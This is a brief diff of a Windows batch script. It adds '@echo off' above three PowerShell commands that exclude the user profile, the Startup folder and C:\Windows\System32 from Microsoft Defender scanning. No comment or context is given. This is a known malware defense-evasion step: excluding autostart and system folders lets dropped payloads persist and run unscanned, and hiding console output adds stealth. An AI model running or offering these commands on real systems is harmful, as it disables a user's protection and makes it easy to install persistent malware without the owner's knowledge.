@@ -1,3 +1,4 @@
+@echo off
 powershell Add-MpPreference -ExclusionPath %userprofile%
 powershell Add-MpPreference -ExclusionPath %userprofile%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
 powershell Add-MpPreference -ExclusionPath c:\windows\system32\
